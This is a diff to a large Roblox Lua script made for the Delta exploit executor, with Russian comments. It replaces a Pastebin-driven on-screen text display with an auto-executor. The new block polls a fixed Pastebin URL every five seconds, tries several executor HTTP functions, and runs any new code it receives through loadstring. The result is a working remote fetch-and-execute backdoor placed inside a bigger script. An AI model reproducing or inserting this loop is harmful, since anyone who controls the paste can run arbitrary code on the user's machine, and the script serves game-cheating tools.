@@ -9279,151 +9279,86 @@ task.spawn(function()
     end
 end)
 
--- == Pink Word Column from Pastebin (Delta-ready, extra bold) ==
+-- ============================================
+-- Pastebin Auto-Executor для Delta Executor
+-- ============================================
+local PASTEBIN_URL = "https://pastebin.com/raw/kKRdR0k5"
+local INTERVAL     = 5       -- опрос каждые 5 секунд
+-- ============================================
 
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+-- Универсальный HTTP-запрос с таймаутом (фикс зависаний Delta)
+local function safeHttpGet(url)
+    local body = nil
+    local done = false
 
-local PASTE_URL = "https://pastebin.com/raw/R5PZadvx"
-local CHECK_INTERVAL = 5
-
--- GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "PinkWordColumn"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local list = Instance.new("Frame")
-list.AnchorPoint = Vector2.new(0.5, 0.5)
-list.Position = UDim2.new(0.5, 0, 0.7, 0)
-list.Size = UDim2.new(0, 700, 0, 500)
-list.BackgroundTransparency = 1
-list.Parent = gui
-
-local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 10)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-layout.Parent = list
-
-local PINK = Color3.fromRGB(255, 105, 180)
-local OUTLINE_COLOR = Color3.fromRGB(0, 0, 0)
-
-local lastText = nil
-
--- безопасная длина (fallback, если utf8 недоступен в экзекьюторе)
-local function wordLen(w)
-    local ok, n = pcall(function() return utf8.len(w) end)
-    if ok and type(n) == "number" and n then return n end
-    return #w
-end
-
-local function isShort(w)
-    local n = wordLen(w)
-    return n == 2 or n == 3
-end
-
-local function buildLines(text)
-    local words = {}
-    for w in text:gmatch("%S+") do
-        words[#words + 1] = w
-    end
-
-    local lines = {}
-    local buffer = {}
-
-    for _, w in ipairs(words) do
-        if isShort(w) then
-            buffer[#buffer + 1] = w
-        else
-            if #buffer > 0 then
-                buffer[#buffer + 1] = w
-                lines[#lines + 1] = table.concat(buffer, " ")
-                buffer = {}
-            else
-                lines[#lines + 1] = w
+    -- Запускаем запрос в отдельном потоке
+    task.spawn(function()
+        local ok, res = pcall(function()
+            -- Перебираем все известные Delta методы запроса
+            if syn and syn.request then
+                return syn.request({Url = url, Method = "GET"}).Body
+            elseif http and http.request then
+                return http.request({Url = url, Method = "GET"}).Body
+            elseif request then
+                return request({Url = url, Method = "GET"}).Body
+            elseif http_request then
+                return http_request({Url = url, Method = "GET"}).Body
+            elseif Delta and Delta.request then
+                return Delta.request({Url = url, Method = "GET"}).Body
+            elseif game and game.HttpGet then
+                return game:HttpGet(url)
             end
-        end
-    end
-
-    if #buffer > 0 then
-        if #lines > 0 then
-            lines[#lines] = lines[#lines] .. " " .. table.concat(buffer, " ")
-        else
-            lines[#lines + 1] = table.concat(buffer, " ")
-        end
-    end
-
-    return lines
-end
-
-local function clearList()
-    for _, c in ipairs(list:GetChildren()) do
-        if c:IsA("TextLabel") then c:Destroy() end
-    end
-end
-
-local function render(text)
-    clearList()
-
-    for word in text:gmatch("%S+") do
-        if word:lower() == "off" then
-            return
-        end
-    end
-
-    local lines = buildLines(text)
-    for i, line in ipairs(lines) do
-        local lbl = Instance.new("TextLabel")
-        lbl.Size = UDim2.new(1, 0, 0, 52)
-        lbl.BackgroundTransparency = 1
-        lbl.TextColor3 = PINK
-        lbl.Font = Enum.Font.GothamBlack     -- максимально жирный шрифт
-        lbl.TextSize = 44
-        lbl.TextXAlignment = Enum.TextXAlignment.Center
-        lbl.Text = line
-        lbl.LayoutOrder = i
-
-        -- тонкий чёрный контур (чёткость)
-        lbl.TextStrokeColor3 = OUTLINE_COLOR
-        lbl.TextStrokeTransparency = 0
-
-        lbl.Parent = list
-
-        -- утолщение букв тем же розовым (Contextual не зарисовывает)
-        local stroke = Instance.new("UIStroke")
-        stroke.Color = PINK
-        stroke.Thickness = 1.5
-        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
-        stroke.LineJoinMode = Enum.LineJoinMode.Round
-        stroke.Parent = lbl
-    end
-end
-
-local function fetchOnce()
-    local ok, result = pcall(function()
-        return game:HttpGet(PASTE_URL .. "?t=" .. tostring(os.time()))
+        end)
+        if ok then body = res end
+        done = true
     end)
 
-    if not ok or not result then
-        warn("[PinkColumn] Не удалось загрузить пасту: " .. tostring(result))
+    -- Ждём ответа максимум 4 секунды (чтобы не «съесть» весь интервал)
+    local start = tick()
+    while not done and (tick() - start) < 4 do
+        task.wait(0.1)
+    end
+
+    return body
+end
+
+local lastCode = ""
+
+local function pollAndRun()
+    local raw = safeHttpGet(PASTEBIN_URL)
+
+    -- Пропускаем, если ответа нет, пусто или это HTML-страница
+    if not raw or raw == "" or raw:sub(1, 1) == "<" then
         return
     end
 
-    local trimmed = result:gsub("^%s+", ""):gsub("%s+$", "")
+    -- Не запускаем, если код не изменился
+    if raw == lastCode then
+        return
+    end
 
-    if lastText == trimmed then return end
-    lastText = trimmed
-    render(trimmed)
+    lastCode = raw
+
+    -- Выполняем полученный код
+    local chunk, compileErr = loadstring(raw)
+    if not chunk then
+        warn("[AutoExec] Ошибка компиляции: " .. tostring(compileErr))
+        return
+    end
+
+    local success, runErr = pcall(chunk)
+    if not success then
+        warn("[AutoExec] Ошибка выполнения: " .. tostring(runErr))
+    else
+        print("[AutoExec] Код обновлён и выполнен.")
+    end
 end
 
--- старт
-fetchOnce()
-
+-- Бесконечный цикл (работает в фоне и не блокирует основной скрипт)
 task.spawn(function()
+    task.wait(1) -- небольшая пауза перед первым запуском
     while true do
-        task.wait(CHECK_INTERVAL)
-        fetchOnce()
+        pollAndRun()
+        task.wait(INTERVAL)
     end
 end)
